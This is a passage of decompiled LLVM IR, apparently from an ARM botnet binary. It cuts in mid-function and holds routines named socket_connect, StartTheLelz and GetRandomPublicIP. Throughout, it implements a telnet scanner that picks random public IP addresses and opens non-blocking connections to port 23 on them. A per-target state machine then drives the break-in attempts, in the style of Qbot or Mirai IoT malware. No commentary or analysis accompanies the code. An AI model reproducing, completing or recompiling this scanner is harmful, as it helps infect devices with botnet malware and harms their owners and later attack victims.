  %v3_c998 = urem i32 %v0_c98c, 65536
  store i32 %v3_c998, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_c9a0 = trunc i32 %v0_c98c to i8
  %v3_c9a0 = add i32 %tmp4, 4
  %v4_c9a0 = inttoptr i32 %v3_c9a0 to i8*
  store i8 %v1_c9a0, i8* %v4_c9a0, align 1
  %v0_c9a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_c9a43 = udiv i32 %v0_c9a4, 256
  %v1_c9a8 = trunc i32 %v3_c9a43 to i8
  %v2_c9a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9a8 = add i32 %v2_c9a8, 5
  %v4_c9a8 = inttoptr i32 %v3_c9a8 to i8*
  store i8 %v1_c9a8, i8* %v4_c9a8, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c9b4 = add i32 %tmp4, 6
  %v4_c9b4 = inttoptr i32 %v3_c9b4 to i8*
  store i8 0, i8* %v4_c9b4, align 1
  %v0_c9b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c9b8 = trunc i32 %v0_c9b8 to i8
  %v2_c9b8 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9b8 = add i32 %v2_c9b8, 7
  %v4_c9b8 = inttoptr i32 %v3_c9b8 to i8*
  store i8 %v1_c9b8, i8* %v4_c9b8, align 1
  %v3_c9c4 = add i32 %tmp4, 8
  %v4_c9c4 = inttoptr i32 %v3_c9c4 to i8*
  store i8 -1, i8* %v4_c9c4, align 1
  %v3_c9d0 = add i32 %tmp4, 9
  %v4_c9d0 = inttoptr i32 %v3_c9d0 to i8*
  store i8 %tmp, i8* %v4_c9d0, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_c9dc = add i32 %tmp4, 10
  %v4_c9dc = inttoptr i32 %v3_c9dc to i8*
  store i8 0, i8* %v4_c9dc, align 1
  %v0_c9e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_c9e0 = trunc i32 %v0_c9e0 to i8
  %v2_c9e0 = load i32, i32* %r2.global-to-local, align 4
  %v3_c9e0 = add i32 %v2_c9e0, 11
  %v4_c9e0 = inttoptr i32 %v3_c9e0 to i8*
  store i8 %v1_c9e0, i8* %v4_c9e0, align 1
  %v2_c9ec = add i32 %tmp4, 12
  %v3_c9ec = inttoptr i32 %v2_c9ec to i32*
  store i32 %arg3, i32* %v3_c9ec, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_c9f8 = add i32 %tmp4, 16
  %v3_c9f8 = inttoptr i32 %v2_c9f8 to i32*
  store i32 %arg2, i32* %v3_c9f8, align 4
  store i32 %v3_c8f4, i32* @fp, align 4
  ret i32 %v0_c98c

; uselistorder directives
  uselistorder i32 %v0_c98c, { 1, 2, 0 }
  uselistorder i32 %v3_c984, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_ca20 = icmp sgt i32 %arg1, 2
  br i1 %v8_ca20, label %dec_label_pc_ca30, label %dec_label_pc_ca40

dec_label_pc_ca30:                                ; preds = %entry
  %v1_ca34 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_ca40

dec_label_pc_ca40:                                ; preds = %entry, %dec_label_pc_ca30
  %storemerge1 = phi i32 [ 0, %dec_label_pc_ca30 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_ca40, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_ca54 = load i32, i32* @fp, align 4
  store i32 51804, i32* %stack_var_-4, align 4
  %v2_ca58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_ca58, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  %v1_ca80 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_ca90 = icmp eq i32 %v1_ca80, 0
  br i1 %v2_ca90, label %dec_label_pc_ca98, label %dec_label_pc_caa4

dec_label_pc_ca98:                                ; preds = %entry
  br label %dec_label_pc_cb8c

dec_label_pc_caa4:                                ; preds = %entry
  %tmp = sext i8 %arg2 to i32
  %v1_caa8 = add i32 %v1_ca80, 16
  %v2_caa8 = inttoptr i32 %v1_caa8 to i32*
  %v3_caa8 = load i32, i32* %v2_caa8, align 4
  %v1_caac = inttoptr i32 %v3_caa8 to i32*
  %v2_caac = load i32, i32* %v1_caac, align 4
  %v1_cab4 = add i32 %v1_ca80, 12
  %v2_cab4 = inttoptr i32 %v1_cab4 to i32*
  %v3_cab4 = load i32, i32* %v2_cab4, align 4
  store i32 %v3_cab4, i32* @r2, align 4
  %v2_cac0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cacc = call i32 @bcopy(i32 %v2_caac, i32 %v2_cac0, i32 %v3_cab4)
  %v1_cae4 = call i32 @htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v0_cb14 = call i32 @socket()
  %v6_cb3c = call i32 @__GI_setsockopt(i32 %v0_cb14, i32 6, i32 1, i32* nonnull %stack_var_-44, i32 4)
  %v3_cb44 = icmp eq i32 %v0_cb14, -1
  br i1 %v3_cb44, label %dec_label_pc_cb4c, label %dec_label_pc_cb58

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_caa4
  br label %dec_label_pc_cb8c

dec_label_pc_cb58:                                ; preds = %dec_label_pc_caa4
  %v3_cb68 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v4_cb68 = call i32 @__libc_connect(i32 %v0_cb14, %sockaddr* %v3_cb68, i32 16)
  %v3_cb70 = icmp eq i32 %v4_cb68, -1
  br i1 %v3_cb70, label %dec_label_pc_cb78, label %dec_label_pc_cb84

dec_label_pc_cb78:                                ; preds = %dec_label_pc_cb58
  br label %dec_label_pc_cb8c

dec_label_pc_cb84:                                ; preds = %dec_label_pc_cb58
  br label %dec_label_pc_cb8c

dec_label_pc_cb8c:                                ; preds = %dec_label_pc_cb78, %dec_label_pc_cb4c, %dec_label_pc_ca98, %dec_label_pc_cb84
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_ca98 ], [ 0, %dec_label_pc_cb4c ], [ 0, %dec_label_pc_cb78 ], [ %v0_cb14, %dec_label_pc_cb84 ]
  store i32 %v3_ca54, i32* @fp, align 4
  ret i32 %stack_var_-56.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_cb8c, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_cb9c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_cb9c, i32* %ip.global-to-local, align 4
  %v3_cba0 = load i32, i32* @r4, align 4
  store i32 %v3_cba0, i32* %stack_var_-24, align 4
  store i32 52136, i32* %stack_var_-4, align 4
  %v19_cba0 = ptrtoint i32* %stack_var_-24 to i32
  %v2_cba4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_cba4, i32* @fp, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_cbc0 = call i32 @__GI_time(i32* null)
  store i32 %v2_cbc0, i32* %r3.global-to-local, align 4
  store i32 %v2_cbc0, i32* @r4, align 4
  %v0_cbcc = call i32 @rand_cmwc()
  %v0_cbd4 = load i32, i32* @r4, align 4
  %v2_cbd4 = xor i32 %v0_cbd4, %v0_cbcc
  store i32 %v2_cbd4, i32* %r3.global-to-local, align 4
  %v1_cbdc = call i32 @srand(i32 %v2_cbd4)
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_cbf4 = call i32 @htons(i32 23)
  %v2_cc0c = ptrtoint i32* %stack_var_-604 to i32
  store i32 %v2_cc0c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-604, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_cc28 = call i32 @malloc(i32 1025)
  store i32 1025, i32* %r3.global-to-local, align 4
  store i32 1025, i32* @r2, align 4
  %v2_cc50 = inttoptr i32 %v1_cc28 to i8*
  %v3_cc50 = call i32 @__GI_memset(i8* %v2_cc50, i32 0)
  %v2_cc60 = mul i32 %arg2, 28
  %v1_cc64 = or i32 %v2_cc60, 3
  %v1_cc68 = add i32 %v1_cc64, 3
  %v3_cc6c = and i32 %v1_cc68, -4
  %v1_cc74 = load i32, i32* @sp, align 4
  %v2_cc74 = sub i32 %v1_cc74, %v3_cc6c
  %v1_cc84 = add i32 %v2_cc74, 7
  %v3_cc88 = and i32 %v1_cc84, -4
  %v2_ccac = mul i32 %arg2, 5
  store i32 %v2_ccac, i32* %r3.global-to-local, align 4
  store i32 %v2_ccac, i32* @r2, align 4
  %v2_ccc0 = inttoptr i32 %v3_cc88 to i8*
  %v3_ccc0 = call i32 @__GI_memset(i8* %v2_ccc0, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_cda061 = icmp sgt i32 %arg2, 0
  br i1 %v5_cda061, label %dec_label_pc_ccd0, label %dec_label_pc_cda4

dec_label_pc_ccd0:                                ; preds = %entry, %dec_label_pc_ccd0
  %storemerge462 = phi i32 [ %v1_cd8c, %dec_label_pc_ccd0 ], [ 0, %entry ]
  %v2_cce0 = mul i32 %storemerge462, 28
  %v2_cce4 = add i32 %v2_cce0, %v3_cc88
  store i32 %v2_cce4, i32* %r3.global-to-local, align 4
  %v2_ccec = inttoptr i32 %v2_cce4 to i32*
  store i32 0, i32* %v2_ccec, align 4
  %v0_ccf0 = load i32, i32* %r3.global-to-local, align 4
  %v1_ccf0 = add i32 %v0_ccf0, 4
  store i32 %v1_ccf0, i32* %r3.global-to-local, align 4
  %v2_ccf8 = inttoptr i32 %v1_ccf0 to i32*
  store i32 0, i32* %v2_ccf8, align 4
  %v0_ccfc = load i32, i32* %r3.global-to-local, align 4
  %v1_ccfc = add i32 %v0_ccfc, 4
  store i32 %v1_ccfc, i32* %r3.global-to-local, align 4
  %v2_cd04 = inttoptr i32 %v1_ccfc to i32*
  store i32 0, i32* %v2_cd04, align 4
  %v0_cd08 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd08 = add i32 %v0_cd08, 4
  store i32 %v1_cd08, i32* %r3.global-to-local, align 4
  %v2_cd10 = inttoptr i32 %v1_cd08 to i32*
  store i32 0, i32* %v2_cd10, align 4
  %v0_cd14 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd14 = add i32 %v0_cd14, 4
  store i32 %v1_cd14, i32* %r3.global-to-local, align 4
  %v2_cd1c = inttoptr i32 %v1_cd14 to i32*
  store i32 0, i32* %v2_cd1c, align 4
  %v0_cd20 = load i32, i32* %r3.global-to-local, align 4
  %v1_cd20 = add i32 %v0_cd20, 4
  store i32 %v1_cd20, i32* %r3.global-to-local, align 4
  %v2_cd28 = inttoptr i32 %v1_cd20 to i32*
  store i32 0, i32* %v2_cd28, align 4
  %v0_cd2c = load i32, i32* %r3.global-to-local, align 4
  %v1_cd2c = add i32 %v0_cd2c, 4
  %v2_cd34 = inttoptr i32 %v1_cd2c to i32*
  store i32 0, i32* %v2_cd34, align 4
  %v3_cd5c = add i32 %v2_cce4, 9
  %v4_cd5c = inttoptr i32 %v3_cd5c to i8*
  store i8 1, i8* %v4_cd5c, align 1
  %v2_cd7c = add i32 %v2_cce4, 24
  %v2_cd84 = inttoptr i32 %v2_cd7c to i32*
  store i32 %v1_cc28, i32* %v2_cd84, align 4
  %v1_cd8c = add nuw nsw i32 %storemerge462, 1
  store i32 %v1_cd8c, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_cda0 = icmp slt i32 %v1_cd8c, %arg2
  br i1 %v5_cda0, label %dec_label_pc_ccd0, label %dec_label_pc_cda4

dec_label_pc_cda4:                                ; preds = %dec_label_pc_ccd0, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_cdac

dec_label_pc_cdac:                                ; preds = %dec_label_pc_cdac, %dec_label_pc_cda4
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_cda4 ], [ %v1_cdb0, %dec_label_pc_cdac ]
  %v1_cdb0 = add i32 %stack_var_-56.0, 1
  store i32 %v1_cdb0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([10 x i8*]* @global_var_2c4a4.328 to i32), i32* %r3.global-to-local, align 4
  %v4_cdc0 = mul i32 %v1_cdb0, 4
  %v5_cdc0 = add i32 %v4_cdc0, ptrtoint ([10 x i8*]* @global_var_2c4a4.328 to i32)
  %v6_cdc0 = inttoptr i32 %v5_cdc0 to i32*
  %v7_cdc0 = load i32, i32* %v6_cdc0, align 4
  store i32 %v7_cdc0, i32* %r3.global-to-local, align 4
  %v2_cdc4 = icmp eq i32 %v7_cdc0, 0
  br i1 %v2_cdc4, label %dec_label_pc_cdcc.preheader, label %dec_label_pc_cdac

dec_label_pc_cdcc.preheader:                      ; preds = %dec_label_pc_cdac
  %v2_ce54 = add i32 %v3_cc88, 8
  %v2_d188 = add i32 %v3_cc88, 4
  %v3_d278 = bitcast i32* %stack_var_-612 to %sockaddr*
  %v2_d2e8 = ptrtoint i32* %stack_var_-324 to i32
  %v2_d3e4 = ptrtoint i32* %stack_var_-332 to i32
  %v2_d440 = ptrtoint i32* %stack_var_-340 to i32
  %v2_d444 = ptrtoint i32* %stack_var_-336 to i32
  %v2_d560 = add i32 %v3_cc88, 16
  %v2_d5dc = add i32 %v3_cc88, 24
  br label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_df5c, %dec_label_pc_cdcc.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v5_cda061, label %dec_label_pc_cdd8, label %dec_label_pc_cdcc

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_df5c
  %storemerge553 = phi i32 [ %v1_df60, %dec_label_pc_df5c ], [ 0, %dec_label_pc_cdcc ]
  %v3_cde4 = mul i32 %storemerge553, 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_cdec = mul i32 %storemerge553, 28
  %v2_cdf0 = add i32 %v2_cdec, %v3_cc88
  %v2_cdf4 = add i32 %v2_cdf0, 16
  store i32 %v2_cdf4, i32* %r3.global-to-local, align 4
  %v1_cdf8 = inttoptr i32 %v2_cdf4 to i32*
  %v2_cdf8 = load i32, i32* %v1_cdf8, align 4
  store i32 %v2_cdf8, i32* %r3.global-to-local, align 4
  %v2_cdfc = icmp eq i32 %v2_cdf8, 0
  br i1 %v2_cdfc, label %dec_label_pc_ce04, label %dec_label_pc_ce3c

dec_label_pc_ce04:                                ; preds = %dec_label_pc_cdd8
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ce0c = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ce20 = load i32, i32* @r4, align 4
  %v3_ce24 = mul i32 %v0_ce20, 4
  store i32 %v3_ce24, i32* %r2.global-to-local, align 4
  %v2_ce2c = mul i32 %v0_ce20, 28
  %v2_ce34 = add i32 %v2_d560, %v2_ce2c
  store i32 %v2_ce34, i32* %r3.global-to-local, align 4
  %v2_ce38 = inttoptr i32 %v2_ce34 to i32*
  store i32 %v2_ce0c, i32* %v2_ce38, align 4
  br label %dec_label_pc_ce3c

dec_label_pc_ce3c:                                ; preds = %dec_label_pc_cdd8, %dec_label_pc_ce04
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_ce58 = add i32 %v2_ce54, %v2_cdec
  store i32 %v2_ce58, i32* %r3.global-to-local, align 4
  %v1_ce5c = inttoptr i32 %v2_ce58 to i8*
  %v2_ce5c = load i8, i8* %v1_ce5c, align 4
  %v3_ce5c = sext i8 %v2_ce5c to i32
  %v4_ce5c = zext i8 %v2_ce5c to i32
  store i32 %v4_ce5c, i32* %r3.global-to-local, align 4
  switch i32 %v3_ce5c, label %dec_label_pc_df5c [
    i32 0, label %dec_label_pc_ce8c
    i32 1, label %dec_label_pc_d2fc.lr.ph
    i32 2, label %dec_label_pc_d5a8
    i32 3, label %dec_label_pc_d6f4
    i32 4, label %dec_label_pc_d848
    i32 5, label %dec_label_pc_d994
    i32 6, label %dec_label_pc_dae8
    i32 7, label %dec_label_pc_ddec
  ]

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_ce3c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_cea8 = add i32 %v2_cdf0, 8
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_ceac = add i32 %v2_cdf0, 9
  %v2_ceac = inttoptr i32 %v1_ceac to i8*
  %v3_ceac = load i8, i8* %v2_ceac, align 1
  %v7_ceb0 = icmp eq i8 %v3_ceac, 1
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v7_ceb0, label %dec_label_pc_ceb8, label %dec_label_pc_cfa4

dec_label_pc_ceb8:                                ; preds = %dec_label_pc_ce8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_ced4 = add i32 %v2_cdf0, 24
  store i32 %v2_ced4, i32* %r3.global-to-local, align 4
  %v1_ced8 = inttoptr i32 %v2_ced4 to i32*
  %v2_ced8 = load i32, i32* %v1_ced8, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_cefc = inttoptr i32 %v2_cdf0 to i32*
  store i32 0, i32* %v2_cefc, align 4
  %v0_cf00 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf00 = add i32 %v0_cf00, 4
  store i32 %v1_cf00, i32* %r3.global-to-local, align 4
  %v2_cf08 = inttoptr i32 %v1_cf00 to i32*
  store i32 0, i32* %v2_cf08, align 4
  %v0_cf0c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf0c = add i32 %v0_cf0c, 4
  store i32 %v1_cf0c, i32* %r3.global-to-local, align 4
  %v2_cf14 = inttoptr i32 %v1_cf0c to i32*
  store i32 0, i32* %v2_cf14, align 4
  %v0_cf18 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf18 = add i32 %v0_cf18, 4
  store i32 %v1_cf18, i32* %r3.global-to-local, align 4
  %v2_cf20 = inttoptr i32 %v1_cf18 to i32*
  store i32 0, i32* %v2_cf20, align 4
  %v0_cf24 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf24 = add i32 %v0_cf24, 4
  store i32 %v1_cf24, i32* %r3.global-to-local, align 4
  %v2_cf2c = inttoptr i32 %v1_cf24 to i32*
  store i32 0, i32* %v2_cf2c, align 4
  %v0_cf30 = load i32, i32* %r3.global-to-local, align 4
  %v1_cf30 = add i32 %v0_cf30, 4
  store i32 %v1_cf30, i32* %r3.global-to-local, align 4
  %v2_cf38 = inttoptr i32 %v1_cf30 to i32*
  store i32 0, i32* %v2_cf38, align 4
  %v0_cf3c = load i32, i32* %r3.global-to-local, align 4
  %v1_cf3c = add i32 %v0_cf3c, 4
  %v2_cf44 = inttoptr i32 %v1_cf3c to i32*
  store i32 0, i32* %v2_cf44, align 4
  store i32 %v2_ced4, i32* %r2.global-to-local, align 4
  store i32 %v2_ced8, i32* %r3.global-to-local, align 4
  store i32 %v2_ced8, i32* %v1_ced8, align 4
  store i32 %storemerge553, i32* @r4, align 4
  %v5_cf74 = call i32 @GetRandomPublicIP(i32 24, i32 %v3_cc88, i32 %v2_ced4, i32 %v2_ced8, i32 %v2_ced8)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_cf84 = load i32, i32* @r4, align 4
  %v3_cf88 = mul i32 %v0_cf84, 4
  store i32 %v3_cf88, i32* %r2.global-to-local, align 4
  %v2_cf90 = mul i32 %v0_cf84, 28
  %v2_cf98 = add i32 %v2_d188, %v2_cf90
  store i32 %v2_cf98, i32* %r3.global-to-local, align 4
  %v2_cf9c = inttoptr i32 %v2_cf98 to i32*
  store i32 %v5_cf74, i32* %v2_cf9c, align 4
  br label %dec_label_pc_d130

dec_label_pc_cfa4:                                ; preds = %dec_label_pc_ce8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_cfc4 = load i8, i8* %v2_ceac, align 1
  %v4_cfc4 = zext i8 %v3_cfc4 to i32
  store i32 %v4_cfc4, i32* %r3.global-to-local, align 4
  %v2_cfc8 = icmp eq i8 %v3_cfc4, 0
  br i1 %v2_cfc8, label %dec_label_pc_cfd0, label %dec_label_pc_d130

dec_label_pc_cfd0:                                ; preds = %dec_label_pc_cfa4
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_cff4 = add i32 %v2_cdf0, 11
  %v2_cff4 = inttoptr i32 %v1_cff4 to i8*
  %v3_cff4 = load i8, i8* %v2_cff4, align 1
  %v1_cff8 = add i8 %v3_cff4, 1
  store i8 %v1_cff8, i8* %v2_cff4, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v1_d04c = add i32 %v2_cdf0, 10
  %v2_d04c = inttoptr i32 %v1_d04c to i8*
  %v3_d04c = load i8, i8* %v2_d04c, align 2
  %v1_d050 = add i8 %v3_d04c, 1
  store i32 %v3_cc88, i32* %ip.global-to-local, align 4
  store i8 %v1_d050, i8* %v2_d04c, align 2
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_d0a0 = load i8, i8* %v2_cff4, align 1
  %v7_d0a4 = icmp eq i8 %v3_d0a0, 3
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0ac, label %dec_label_pc_d0d8

dec_label_pc_d0ac:                                ; preds = %dec_label_pc_cfd0
  store i32 %v2_cea8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_ceac, align 1
  br label %dec_label_pc_df5c

dec_label_pc_d0d8:                                ; preds = %dec_label_pc_cfd0
  store i32 %v2_cea8, i32* %r3.global-to-local, align 4
  %v3_d0f8 = load i8, i8* %v2_d04c, align 2
  %v4_d0f8 = zext i8 %v3_d0f8 to i32
  store i32 %v4_d0f8, i32* %r3.global-to-local, align 4
  %v7_d0fc = icmp eq i8 %v3_d0f8, 3
  br i1 %v7_d0fc, label %dec_label_pc_d104, label %dec_label_pc_d130

dec_label_pc_d104:                                ; preds = %dec_label_pc_d0d8
  store i32 %v2_cea8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v2_ceac, align 1
  br label %dec_label_pc_df5c

dec_label_pc_d130:                                ; preds = %dec_label_pc_d0d8, %dec_label_pc_cfa4, %dec_label_pc_ceb8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_d144 = call i32 @htons(i32 23)
  store i32 0, i32* %stack_var_-604, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_d18c = add i32 %v2_d188, %v2_cdec
  store i32 %v2_d18c, i32* %r3.global-to-local, align 4
  %v1_d190 = inttoptr i32 %v2_d18c to i32*
  %v2_d190 = load i32, i32* %v1_d190, align 4
  store i32 %v2_d190, i32* %r3.global-to-local, align 4
  store i32 %storemerge553, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_d1a8 = call i32 @socket()
  %v0_d1b0 = load i32, i32* @r4, align 4
  %v2_d1bc = mul i32 %v0_d1b0, 28
  %v2_d1c0 = add i32 %v2_d1bc, %v3_cc88
  %v2_d1c4 = inttoptr i32 %v2_d1c0 to i32*
  store i32 %v0_d1a8, i32* %v2_d1c4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d1e0 = inttoptr i32 %v2_cdf0 to i32*
  %v2_d1e0 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d1e0, i32* %r3.global-to-local, align 4
  %v7_d1e4 = icmp eq i32 %v2_d1e0, -1
  br i1 %v7_d1e4, label %dec_label_pc_df5c, label %dec_label_pc_d1ec

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d130
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d204 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d204, i32* @r4, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d220 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d220, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_d230 = call i32 @__libc_fcntl(i32 %v2_d220, i32 3)
  %v1_d238 = or i32 %v2_d230, 2048
  store i32 %v1_d238, i32* %r3.global-to-local, align 4
  %v0_d23c = load i32, i32* @r4, align 4
  store i32 %v1_d238, i32* @r2, align 4
  %v2_d248 = call i32 @__libc_fcntl(i32 %v0_d23c, i32 4)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_d264 = load i32, i32* %v1_d1e0, align 4
  store i32 %v2_d264, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_d278 = call i32 @__libc_connect(i32 %v2_d264, %sockaddr* nonnull %v3_d278, i32 16)
  store i32 %v4_d278, i32* %r3.global-to-local, align 4
  %v3_d280 = icmp eq i32 %v4_d278, -1
  br i1 %v3_d280, label %dec_label_pc_d288, label %dec_label_pc_d2c0

dec_label_pc_d288:                                ; preds = %dec_label_pc_d1ec
  %v0_d288 = call i32 @__errno_location()
  store i32 %v0_d288, i32* %r3.global-to-local, align 4
  %v1_d290 = inttoptr i32 %v0_d288 to i32*
  %v2_d290 = load i32, i32* %v1_d290, align 4
  store i32 %v2_d290, i32* %r3.global-to-local, align 4
  %v7_d294 = icmp eq i32 %v2_d290, 115
  br i1 %v7_d294, label %dec_label_pc_d2c0, label %dec_label_pc_d29c

dec_label_pc_d29c:                                ; preds = %dec_label_pc_d288
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d2b8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_d2c0:                                ; preds = %dec_label_pc_d1ec, %dec_label_pc_d288
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_d2e0 = call i32 @advance_state(i32* nonnull %v1_d1e0, i32 1)
  br label %dec_label_pc_df5c

dec_label_pc_d2fc.lr.ph:                          ; preds = %dec_label_pc_ce3c
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d2fc

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2fc.lr.ph, %dec_label_pc_d2fc
  %storemerge610 = phi i32 [ 0, %dec_label_pc_d2fc.lr.ph ], [ %v1_d310, %dec_label_pc_d2fc ]
  store i32 %v2_d2e8, i32* %r2.global-to-local, align 4
  %v5_d308 = mul nuw nsw i32 %storemerge610, 4
  %v6_d308 = add i32 %v5_d308, %v2_d2e8
  %v7_d308 = inttoptr i32 %v6_d308 to i32*
  store i32 0, i32* %v7_d308, align 4
  %v1_d310 = add nuw nsw i32 %storemerge610, 1
  store i32 %v1_d310, i32* %r3.global-to-local, align 4
  %tmp43 = icmp ult i32 %v1_d310, 32
  br i1 %tmp43, label %dec_label_pc_d2fc, label %dec_label_pc_d324

dec_label_pc_d324:                                ; preds = %dec_label_pc_d2fc
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_d33c = inttoptr i32 %v2_cdf0 to i32*
  %v2_d33c = load i32, i32* %v1_d33c, align 4
